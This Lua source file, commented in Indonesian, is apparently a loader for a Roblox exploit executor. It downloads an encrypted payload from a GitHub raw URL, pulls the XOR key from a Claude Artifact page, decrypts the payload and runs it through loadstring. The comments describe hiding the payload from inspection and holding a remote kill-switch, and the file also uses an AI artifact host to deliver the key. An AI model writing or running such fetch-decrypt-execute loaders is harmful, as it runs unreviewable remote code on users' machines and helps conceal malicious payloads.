--[[
  Joevan simple-enc POC loader
  ----------------------------------------------------------------
  Skema: payload DIENKRIPSI (XOR repeating-key + base64), tidak di-obfuscate.
  Loader ini plaintext (diizinkan oleh rule repo, karena payload terenkripsi).
  KEY tidak ada di repo -- diambil runtime dari sebuah Claude Artifact.

  CATATAN KEAMANAN (baca README): ini security-by-obscurity, BUKAN enkripsi
  yang benar-benar aman. Siapa pun yang bisa membuka URL artifact bisa ambil
  key-nya juga. Nilai utamanya: kill-switch / rotasi key dari sisi kamu.
--]]

local PAYLOAD_URL = "https://raw.githubusercontent.com/zugkun/Encrypted-lab/main/simple-enc/payload.enc"
-- URL Claude Artifact yang mem-publish key (POC):
-- CATATAN: artifact ini masih PRIVATE -- executor TIDAK bisa HttpGet sampai
-- di-share/publik lewat menu Share di halaman artifact. Tes dulu dari executor.
local KEY_URL     = "https://claude.ai/artifact/MBaypPukmzg6cBRvtPVAGC"

-- base64 decode
local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64decode(data)
  data = data:gsub("[^" .. "A-Za-z0-9+/" .. "]", "")
  local out, bits, nbits = {}, 0, 0
  for i = 1, #data do
    local c = data:sub(i, i)
    if c == "=" then break end
    local v = B64:find(c, 1, true)
    if not v then return nil end
    bits = bits * 64 + (v - 1)
    nbits = nbits + 6
    if nbits >= 8 then
      nbits = nbits - 8
      out[#out + 1] = string.char(math.floor(bits / 2 ^ nbits) % 256)
      bits = bits % (2 ^ nbits)
    end
  end
  return table.concat(out)
end

local function http_get(url)
  local ok, body = pcall(function() return game:HttpGet(url) end)
  if ok and type(body) == "string" and #body > 0 then return body end
  return nil
end

-- Ambil key dari artifact: dicari di antara marker KEYSTART:<base64>:KEYEND
local function fetch_key()
  local page = http_get(KEY_URL)
  if not page then return nil end
  local k = page:match("KEYSTART:([A-Za-z0-9+/=]+):KEYEND")
  if not k then return nil end
  return b64decode(k)
end

local function xor_decrypt(data, key)
  local kl = #key
  local out = {}
  for i = 1, #data do
    local b = string.byte(data, i)
    local k = string.byte(key, ((i - 1) % kl) + 1)
    out[i] = string.char(bit32 and bit32.bxor(b, k) or (b ~ k))
  end
  return table.concat(out)
end

local blob = http_get(PAYLOAD_URL)
if not blob then error("[simple-enc] gagal ambil payload") end

local key = fetch_key()
if not key or #key == 0 then error("[simple-enc] gagal ambil key dari artifact (akses dicabut?)") end

local enc = b64decode(blob)
if not enc then error("[simple-enc] payload base64 rusak") end

local src = xor_decrypt(enc, key)
local fn, err = loadstring(src)
if not fn then error("[simple-enc] payload tidak valid: " .. tostring(err)) end
return fn()
